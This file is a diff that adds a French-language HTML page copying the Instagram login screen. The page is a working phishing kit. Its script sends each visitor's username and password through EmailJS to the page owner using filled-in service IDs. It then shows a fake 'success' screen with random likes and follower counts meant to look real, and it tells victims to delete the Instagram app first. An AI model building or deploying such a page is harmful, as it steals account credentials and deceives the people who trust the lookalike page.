@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Instagram (Démo avec envoi email)</title>
+    <style>
+        /* Styles identiques à l'original, inchangés */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+        }
+
+        /* Carte principale */
+        .login-card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-text {
+            font-family: 'Billabong', cursive;
+            font-size: 50px;
+            color: #262626;
+            margin: 0;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 0 7px 8px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            padding: 7px 16px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: background 0.2s;
+        }
+
+        .btn-login:hover {
+            background-color: #1877f2;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .separator::before {
+            margin-right: 18px;
+        }
+
+        .separator::after {
+            margin-left: 18px;
+        }
+
+        .fb-login {
+            text-align: center;
+            margin: 8px 0;
+        }
+
+        .fb-login a {
+            text-decoration: none;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 12px;
+        }
+
+        .forgot-password a {
+            text-decoration: none;
+            color: #00376b;
+            font-size: 12px;
+        }
+
+        .signup-card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 30px;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-card a {
+            text-decoration: none;
+            color: #0095f6;
+            font-weight: 600;
+        }
+
+        .get-app {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+
+        .app-badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+        }
+
+        .app-badges img {
+            height: 40px;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+        }
+
+        footer ul {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 16px;
+            margin-bottom: 15px;
+        }
+
+        footer a {
+            text-decoration: none;
+            color: #8e8e8e;
+        }
+
+        footer p {
+            margin-top: 10px;
+        }
+
+        /* Style pour le message de statut */
+        #statusMessage {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+        }
+
+        /* ===== NOUVEAU : Styles pour la page APRÈS connexion ===== */
+        .success-card {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 30px 20px;
+            width: 100%;
+            margin-bottom: 10px;
+            text-align: center;
+            display: none; /* Cachée par défaut */
+        }
+
+        .success-card.show {
+            display: block; /* S'affiche quand on ajoute la classe "show" */
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: #0095f6;
+            margin-bottom: 15px;
+        }
+
+        .success-card h2 {
+            color: #262626;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+
+        .success-card p {
+            color: #8e8e8e;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .stats-container {
+            display: flex;
+            justify-content: space-around;
+            margin: 25px 0;
+            gap: 15px;
+        }
+
+        .stat-box {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 20px 10px;
+            flex: 1;
+            transition: transform 0.3s;
+        }
+
+        .stat-box:hover {
+            transform: scale(1.05);
+            border-color: #0095f6;
+        }
+
+        .stat-number {
+            font-size: 32px;
+            font-weight: 700;
+            color: #0095f6;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #262626;
+            font-weight: 600;
+        }
+
+        .stat-box.likes .stat-number {
+            color: #ed4956; /* Rouge Instagram pour les likes */
+        }
+
+        .stat-box.followers .stat-number {
+            color: #0095f6; /* Bleu Instagram pour les abonnés */
+        }
+
+        .btn-reset {
+            width: 100%;
+            background-color: transparent;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 7px 16px;
+            color: #262626;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.2s;
+        }
+
+        .btn-reset:hover {
+            background-color: #fafafa;
+            border-color: #0095f6;
+            color: #0095f6;
+        }
+
+        .warning-message {
+            background-color: #ffe6e6;
+            border: 1px solid #ffb3b3;
+            border-radius: 4px;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 12px;
+            color: #cc0000;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .warning-message i {
+            font-size: 16px;
+        }
+    </style>
+    <!-- Ajout de Font Awesome pour les icônes -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- ===== PAGE 1 : CARTE DE CONNEXION (visible au début) ===== -->
+        <div class="login-card" id="loginPage">
+            <div class="logo">
+                <div class="logo-text">Instagram</div>
+            </div>
+
+            <!-- Message d'avertissement (supprimer l'app) -->
+            <div class="warning-message">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span><strong>Important :</strong> Supprimez d'abord l'application Instagram de votre téléphone pour éviter les conflits !</span>
+            </div>
+
+            <!-- Formulaire -->
+            <form id="loginForm" onsubmit="return false;">
+                <div class="form-group">
+                    <input type="text" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" id="username">
+                </div>
+                <div class="form-group">
+                    <input type="password" placeholder="Mot de passe" id="password">
+                </div>
+                <button type="submit" class="btn-login" id="sendBtn">Se connecter</button>
+            </form>
+
+            <!-- Zone d'affichage des messages de statut (envoi, erreur) -->
+            <div id="statusMessage"></div>
+
+            <div class="separator">OU</div>
+
+            <div class="fb-login">
+                <a href="#"><i class="fab fa-facebook-square"></i> Se connecter avec Facebook</a>
+            </div>
+
+            <div class="forgot-password">
+                <a href="#">Mot de passe oublié ?</a>
+            </div>
+        </div>
+
+        <!-- ===== PAGE 2 : PAGE DE SUCCÈS (cachée au début) ===== -->
+        <div class="success-card" id="successPage">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Félicitations ! 🎉</h2>
+            <p>Votre compte a été connecté avec succès</p>
+            
+            <!-- Statistiques -->
+            <div class="stats-container">
+                <div class="stat-box likes">
+                    <div class="stat-number" id="likesCount">+124</div>
+                    <div class="stat-label">Likes</div>
+                </div>
+                <div class="stat-box followers">
+                    <div class="stat-number" id="followersCount">+1.2k</div>
+                    <div class="stat-label">Abonnés</div>
+                </div>
+            </div>
+            
+            <p style="font-size: 12px; color: #8e8e8e; margin: 10px 0;">
+                <i class="fas fa-clock"></i> Mise à jour en temps réel
+            </p>
+            
+            <!-- Bouton pour revenir à la page de connexion -->
+            <button class="btn-reset" id="resetBtn">
+                <i class="fas fa-redo-alt"></i> Retour à la connexion
+            </button>
+        </div>
+
+        <!-- Cartes supplémentaires (inchangées) -->
+        <div class="signup-card">
+            Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
+        </div>
+
+        <div class="get-app">
+            Téléchargez l'application.
+            <div class="app-badges">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Disponible sur Google Play">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Télécharger dans l'App Store">
+            </div>
+        </div>
+
+        <footer>
+            <ul>
+                <li><a href="#">Meta</a></li>
+                <li><a href="#">À propos</a></li>
+                <li><a href="#">Blog</a></li>
+                <li><a href="#">Emplois</a></li>
+                <li><a href="#">Aide</a></li>
+                <li><a href="#">API</a></li>
+                <li><a href="#">Confidentialité</a></li>
+                <li><a href="#">Conditions</a></li>
+                <li><a href="#">Comptes principaux</a></li>
+                <li><a href="#">Hashtags</a></li>
+                <li><a href="#">Lieux</a></li>
+                <li><a href="#">Instagram Lite</a></li>
+            </ul>
+            <p>Français © 2025 Instagram from Meta</p>
+        </footer>
+    </div>
+
+    <!-- Inclusion de la bibliothèque EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script>
+        // Initialisation d'EmailJS avec ta clé publique
+        (function() {
+            // REMPLACE "TA_CLE_PUBLIQUE_ICI" par ta vraie clé !
+            emailjs.init("eQSETuARy3VdBPg_p");
+        })();
+
+        // Récupération des éléments
+        const sendBtn = document.getElementById('sendBtn');
+        const resetBtn = document.getElementById('resetBtn');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const statusDiv = document.getElementById('statusMessage');
+        const loginPage = document.getElementById('loginPage');
+        const successPage = document.getElementById('successPage');
+        const likesCount = document.getElementById('likesCount');
+        const followersCount = document.getElementById('followersCount');
+
+        // Fonction pour générer des nombres aléatoires (pour faire vrai)
+        function generateRandomStats() {
+            const likes = Math.floor(Math.random() * 150) + 80; // entre 80 et 230
+            const followers = Math.floor(Math.random() * 800) + 600; // entre 600 et 1400
+            likesCount.textContent = '+' + likes;
+            followersCount.textContent = '+' + (followers / 1000).toFixed(1) + 'k';
+        }
+
+        // Événement au clic sur le bouton "Se connecter"
+        sendBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            // Vérification
+            if (username === '' || password === '') {
+                statusDiv.innerText = '❌ Veuillez remplir tous les champs.';
+                return;
+            }
+
+            // Désactiver le bouton
+            sendBtn.disabled = true;
+            statusDiv.innerText = '⏳ Connexion en cours...';
+
+            // Préparation des paramètres pour EmailJS
+            const templateParams = {
+                username: username,
+                password: password
+            };
+
+            // Envoi via EmailJS - REMPLACE PAR TES IDENTIFIANTS
+            emailjs.send('service_rh6tft7', 'template_gyj8eh9', templateParams)
+                .then(function(response) {
+                    statusDiv.innerText = '✅ Connexion réussie !';
+                    
+                    // Générer des stats aléatoires
+                    generateRandomStats();
+                    
+                    // Cacher la page de connexion, montrer la page de succès
+                    setTimeout(function() {
+                        loginPage.style.display = 'none';
+                        successPage.classList.add('show');
+                    }, 500);
+                })
+                .catch(function(error) {
+                    statusDiv.innerText = '❌ Erreur : ' + error.text;
+                    console.log('Erreur EmailJS:', error);
+                })
+                .finally(function() {
+                    sendBtn.disabled = false;
+                });
+        });
+
+        // Bouton "Retour à la connexion"
+        resetBtn.addEventListener('click', function() {
+            // Vider les champs
+            usernameInput.value = '';
+            passwordInput.value = '';
+            
+            // Effacer les messages
+            statusDiv.innerText = '';
+            
+            // Revenir à la page de connexion
+            successPage.classList.remove('show');
+            loginPage.style.display = 'block';
+        });
+    </script>
+</body>
+</html>
